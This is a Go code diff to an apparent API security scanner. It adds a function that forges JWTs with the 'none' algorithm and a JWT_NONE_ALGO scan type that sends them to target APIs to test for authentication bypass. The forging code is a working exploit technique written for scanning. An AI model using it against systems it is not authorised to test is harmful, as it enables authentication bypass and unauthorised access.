@@ -3,8 +3,47 @@ import(
 	"fmt"
 	"strings"
 	"encoding/json"
+	"encoding/base64"
 	"karaxys_backend/internal/core"
 )
+
+func forgeNoneToken(originalAuthHeader string) (string, error){
+	parts := strings.Split(originalAuthHeader, " ")
+	if len(parts) != 2 {
+		return "", fmt.Errorf("invalid auth header format")
+	}
+	token := parts[1]
+	jwtParts := strings.Split(token, ".")
+	if len(jwtParts) != 3 {
+		return "", fmt.Errorf("invalid jwt format")
+	}
+	headerBytes, err := base64.RawURLEncoding.DecodeString(jwtParts[0])
+	if err != nil {
+		return "", fmt.Errorf("failed to decode header: %v", err)
+	}
+	var headerMap map[string]interface{}
+	if err := json.Unmarshal(headerBytes, &headerMap); err != nil {
+		return "", fmt.Errorf("failed to parse header json")
+	}
+	
+	headerMap["alg"] = "none"
+	headerMap["typ"] = "JWT" 
+	newHeaderBytes, _ := json.Marshal(headerMap)
+	newHeaderStr := base64.RawURLEncoding.EncodeToString(newHeaderBytes)
+	payloadBytes, err := base64.RawURLEncoding.DecodeString(jwtParts[1])
+	if err != nil{
+		return "", fmt.Errorf("failed to decode payload: %v", err)
+	}
+	var payloadMap map[string]interface{}
+	if err := json.Unmarshal(payloadBytes, &payloadMap); err != nil {
+		return "", fmt.Errorf("failed to parse payload json")
+	}
+	newPayloadBytes, _ := json.Marshal(payloadMap)
+	newPayloadStr := base64.RawURLEncoding.EncodeToString(newPayloadBytes)
+	forgedToken := fmt.Sprintf("Bearer %s.%s.", newHeaderStr, newPayloadStr)
+	
+	return forgedToken, nil
+}
 
 func BuildScanConfig(targetBaseURL string, inventory *core.ApiInventory, reqManualToken string, reqMethod string, testType string) (ScanConfig, error) {
 	tokenToUse := ""
@@ -27,6 +66,21 @@ func BuildScanConfig(targetBaseURL string, inventory *core.ApiInventory, reqManu
 		} else if len(inventory.SampleHeaders["Authorization"]) > 0 {
 			tokenToUse = inventory.SampleHeaders["Authorization"][0]
 		}
+	case "JWT_NONE_ALGO":
+        validToken := ""
+        if reqManualToken != "" {
+            validToken = reqManualToken
+        } else if len(inventory.SampleHeaders["Authorization"]) > 0 {
+            validToken = inventory.SampleHeaders["Authorization"][0]
+        }
+        if validToken == "" {
+            return ScanConfig{}, fmt.Errorf("JWT_NONE_ALGO requires a valid token to manipulate")
+        }
+        forged, err := forgeNoneToken(validToken)
+        if err != nil {
+            return ScanConfig{}, fmt.Errorf("failed to forge token: %v", err)
+        }
+        tokenToUse = forged
 
 	default:
 		if reqManualToken != "" {
